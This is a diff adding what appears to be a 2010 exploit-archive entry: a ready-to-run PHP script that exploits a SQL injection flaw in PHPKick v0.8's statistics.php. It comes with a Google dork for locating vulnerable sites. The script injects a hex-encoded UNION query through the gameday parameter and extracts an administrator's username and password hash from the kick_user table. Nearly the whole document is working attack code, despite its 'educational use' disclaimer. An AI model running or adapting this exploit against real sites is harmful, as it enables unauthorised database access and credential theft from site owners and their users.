@@ -1,0 +1,80 @@
+# Exploit Title: PHPKick v0.8 statistics.php SQL Injection
+# Date: August 8th, 2010
+# Time: 03:45am ;(
+# Author: garwga
+# Version: 0.8
+# Google dork : "© 2004 PHPKick.de Version 0.8"
+# Category:  webapps/0day
+# Code: see below
+ 
+<?php
+	echo"\n\n";
+	echo"|=================PHPKick v0.8 statistics.php SQL Injection==================|\n";
+	echo"|                                                                            |\n";
+	echo"|Syntax: php ".$_SERVER['argv'][0]." [host] [path]                                       |\n";
+	echo"|                                                                            |\n";
+	echo"|Example: php ".$_SERVER['argv'][0]." http://www.domain.com /path/                       |\n";
+    echo"|                                                                            |\n";
+ 
+	echo"|Notes:This exploit works regardless of the PHP security settings            |\n";
+    echo"|      (magic_quotes, register_globals).This exploit is only for educational |\n";
+	echo"|      use, use it on your own risk! Exploiting scripts without permission of|\n";
+	echo"|      the owner of the webspace is illegal!                                 |\n";
+	echo"|      I'm not responsible for any resulting damage                          |\n";
+	echo"|                                                                            |\n";
+	echo"|Google Dork: \"© 2004 PHPKick.de Version 0.8\"                                |\n";
+	echo"|                                                                            |\n";
+	echo"|Exploit found by garwga (ICQ#:453-144-667)                                  |\n";
+	echo"|============================================================================|\n\n\n";
+ 
+ 
+if($_SERVER['argv'][1] && $_SERVER['argv'][2]){
+	$host=$_SERVER['argv'][1];
+	$path=$_SERVER['argv'][2];
+    $spos=strpos($host, "http://");
+  	if(!is_int($spos)&&($spos==0)){
+	   $host="http://$host";
+  	  }
+	if(!$host=="http://localhost"){
+	   $spos=strpos($host, "http://www.");
+  	   if (!is_int($spos)&&($spos==0)){
+	      $host="http://www.$host";
+  	      }
+	  }
+	$exploit="statistics.php?action=overview&gameday=-32%20union%20select%201,2,3,4,0x2720756e696f6e2073656c65637420312c322c636f6e636174286e69636b2c273a272c70617373776f7274292c342c352c362c372066726f6d206b69636b5f757365722077686572652069643d2231222d2d2066,6,7,8--%20f";
+	echo"exploiting...\n";
+	$source=file_get_contents($host.$path.$exploit);
+	$username=GetBetween($source," :<br>",":");
+	echo "username: $username\n";
+	$hash=GetBetween($source,"<br>$username:","</td>");
+	echo"hash: $hash\n";
+	}
+else{
+	echo"\n\n";
+	echo"|=================PHPKick v0.8 statistics.php SQL Injection==================|\n";
+	echo"|                                                                            |\n";
+	echo"|Syntax: php ".$_SERVER['argv'][0]." [host] [path]                                       |\n";
+	echo"|                                                                            |\n";
+	echo"|Example: php ".$_SERVER['argv'][0]." http://www.domain.com /path/                       |\n";
+    echo"|                                                                            |\n";
+ 
+	echo"|Notes:This exploit works regardless of the PHP security settings            |\n";
+    echo"|      (magic_quotes, register_globals).This exploit is only for educational |\n";
+	echo"|      use, use it on your own risk! Exploiting scripts without permission of|\n";
+	echo"|      the owner of the webspace is illegal!                                 |\n";
+	echo"|      I'm not responsible for any resulting damage                          |\n";
+	echo"|                                                                            |\n";
+	echo"|Google Dork: \"© 2004 PHPKick.de Version 0.8\"                                |\n";
+	echo"|                                                                            |\n";
+	echo"|Exploit found by garwga (ICQ#:453-144-667)                                  |\n";
+	echo"|============================================================================|\n";
+}
+function GetBetween($content,$start,$end){
+    $r = explode($start, $content);
+    if (isset($r[1])){
+        $r = explode($end, $r[1]);
+        return $r[0];
+    }
+    return '';
+}
+?>
